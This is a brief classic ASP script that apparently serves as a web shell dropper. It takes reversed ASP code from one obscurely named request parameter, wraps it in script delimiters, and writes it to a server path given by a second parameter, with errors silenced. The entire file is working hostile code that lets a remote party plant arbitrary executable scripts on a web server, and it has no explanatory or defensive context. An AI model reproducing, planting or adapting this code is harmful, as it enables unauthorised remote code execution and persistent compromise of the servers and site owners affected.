<%On Error Resume Next
Set f = Server.CreateObject("ADODB.Stream")
f.Type = 2
f.mode = 3
f.Charset = "gb2312"
f.open
f.WriteText "<"&Chr("37")&StrReverse(Request("cq3h63"))&Chr("37")&">"
f.SaveToFile Replace(Server.MapPath(Request("cq3h61")), ".\", "~1\")%>